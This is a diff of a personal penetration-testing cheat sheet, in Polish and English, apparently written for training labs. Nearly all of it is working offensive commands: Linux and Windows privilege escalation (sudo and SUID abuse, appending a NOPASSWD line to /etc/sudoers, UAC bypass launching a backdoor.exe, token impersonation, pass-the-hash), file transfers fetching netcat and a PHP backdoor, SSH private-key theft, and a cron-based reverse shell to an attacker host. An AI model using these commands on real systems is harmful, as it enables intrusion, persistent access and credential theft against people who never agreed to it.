@@ -137,46 +137,84 @@ C:\wamp\alias\phpmyadmin.conf
 
 
 privilege esc:
+
 linux - ps aux - szukasz procesu chkrootkit
+
 linux - exploit/unix/local/chkrootkit
+
 linux - find / -not -type l -perm -o+w | it will find world writable files
+
 linux - etc/shadow jak można edytować to możemy usera dodać
+
 linux -  find / -user root -perm -4000 -exec ls -ldb {} \ | poszukuje SEUID programs
+
 linux - sudo -l | sprawdź do czego masz uprawnienia sudo bo czasem jak masz np. do nano albo cat to możesz wyświetlić /etc/shadow, a znowu jak masz do vi to możesz z tego poziomu zrobić basha, tak samo z man: otwierasz sudo man, potem !/bin/bash
+
 linux -  grep -nri “/tmp/message” /usr | poszukiwanie plików z daną zawartością, w tym przypadku zapisujących do wskazanej ścieżki
+
 linux - printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+
 linux - plik welcome s ustawionym SUID, "strings welcome" wskazuje wykonanie pliku greetings z poziomu pliku welcome, rm greetings, cp /bin/bash greetings, ./welcome
+
 getsystem
+
 linux - zawsze warto sprawdzić pliki w katalogu domowym oraz w /tmp
+
 linux - generalnie jak jest crontab i privilege esc z tym związane, to szukasz pliku (polecenie stat), który będzie edyowany co minute, jak znajdziesz plik to szukasz pliku, który w swoim kodzie ma edycję pliku (polecenie grep)
+
 windows - exploit/windows/local/bypassuac_injection
+
 windows - Source: https://github.com/itm4n/PrivescCheck  | PowerShell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck "
+
 windows - runas.exe /user:administrator cmd
+
 windows - psexec.py Administrator@target_ip
+
 windows - exploit/windows/smb/psexec
+
 windows - /root/Desktop/tools/UACME/Akagi64.exe | Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+
 windows - Source: https://github.com/PowerShellMafia/PowerSploit
+
 windows - load incognito | list_tokens -u | impersonate_token "ATTACKDEFENSE\Administrator"
+
 windows - crackmapexec smb ip -u Administrator -H "NTLM hash" # zalogowanie się na admina używając hasza NTLM
 
 
 
+
 transfering files:
+
 certutil -urlcache -f http://10.10.3.2/nc.exe nc.exe
+
 python -m SimpleHTTPServer 80
+
 python3 -m http.server 80 
+
 nc.exe -nvlp 1234 > test.txt
+
 nc -nv ip port < test.txt
+
 wget http://ip/php-backdoor.php
 
 
+
 persistence:
+
 windows - getgui
+
 *windows - exploit/windows/local/persistence_service
+
 linux - echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron; crontab -i cron
+
 linux - scp student@192.37.104.3:~/.ssh/id_rsa , a potem ssh -i id_rsa student@192.37.104.3
+
 *linux - echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ip_kali/1234 0>&1'" > cron (TO JEST NAJLEPSZE)
 
+
 fast login:
+
 scanner/ssh/ssh_login
+
 mysql -h ip -u root # jak root jest bez hasła
+
